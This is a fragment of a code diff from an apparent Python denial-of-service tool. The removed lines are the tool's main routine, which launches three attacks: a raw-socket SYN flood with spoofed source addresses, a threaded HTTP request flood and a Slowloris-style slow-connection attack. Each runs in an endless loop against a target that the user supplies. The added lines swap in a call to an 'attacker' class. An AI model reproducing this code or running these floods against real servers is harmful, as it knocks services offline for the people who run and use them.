-			cprint('[*] You have enough permisson to run this script', 'green')
-			time.sleep(0.5)
-		else:
-			sys.exit(cprint('[-] You haven\'t enough permission to run this script', 'red'))
-		tgt = check_tgt(args)
-		synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-		synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-		ts = []
-		threads = []
-		print(colored('[*] Started SYN Flood: ', 'blue') + colored(tgt, 'red'))
-		while 1:
-			if args.i == False:
-				args.fakeip = True
-				if args.fakeip == True:
-					ip = fake_ip()
-			else:
-				ip = args.i
-			try:
-				for x in range(0, int(args.T)):
-					thread = Synflood(tgt, ip, sock=synsock)
-					thread.setDaemon(True)
-					thread.start()
-					thread.join()
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user', 'red'))
-	elif args.Request:
-		tgt = args.d
-		threads = []
-		print(colored('[*] Start send request to: ', 'blue') + colored(tgt, 'red'))
-		while 1:
-			try:
-				for x in range(int(args.T)):
-					t = Requester(tgt)
-					t.daemon = True
-					t.start()
-					t.join()
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user', 'red'))
-	elif args.Pyslow:
-		try:
-			tgt = args.d
-			port = args.p
-			to = float(args.t)
-			st = int(args.s)
-			threads = int(args.T)
-		except Exception as e:
-			print('[-]', e)
-		while 1:
-			try:
-				worker = Pyslow(tgt, port, to, threads, st)
-				worker.doconnection()
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user', 'red'))
-	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
-		parser.print_help()
-		print
-		sys.exit(cprint('[-] You must choose attack type', 'red'))
-
-
-if __name__ == '__main__':
-	main()
+    
+    attacker = CliAttacker(target_url, num_requests)
+    attacker.run()
